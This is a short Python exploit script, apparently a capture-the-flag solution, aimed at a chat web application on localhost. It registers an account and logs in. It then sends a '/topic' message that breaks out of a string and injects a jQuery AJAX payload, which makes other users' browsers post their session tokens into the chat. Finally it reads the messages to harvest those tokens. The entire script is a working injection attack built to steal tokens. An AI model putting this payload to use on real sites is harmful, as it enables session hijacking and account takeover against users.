#!/usr/bin/env python
from pwn import *
import requests, json
import time

HOST='http://127.0.0.1:8080'

login_data = { 'username' : 'pcs', 'password' : 'princess' }

webexploit = '''$.ajax({type: "POST",url: "/api/send",data:{msg:"token:" + token,len:token.length,token:token},success: function(resp){}})'''
#exploit = '''$("#message-input").val("token:" + token) + send_message() '''

requests.post(HOST + '/api/signup', data = login_data ).text
token = json.loads(requests.post(HOST + '/api/login', data = login_data ).text)['token']





requests.post(HOST + '/api/send', data ='msg=%2Ftopic+topics" + ' + webexploit + '+"&len=12&token=' + token).text
#wait three seconds, and collect tokkens.
time.sleep(3)
print requests.get(HOST + '/api/messages', params = 'since=1').text
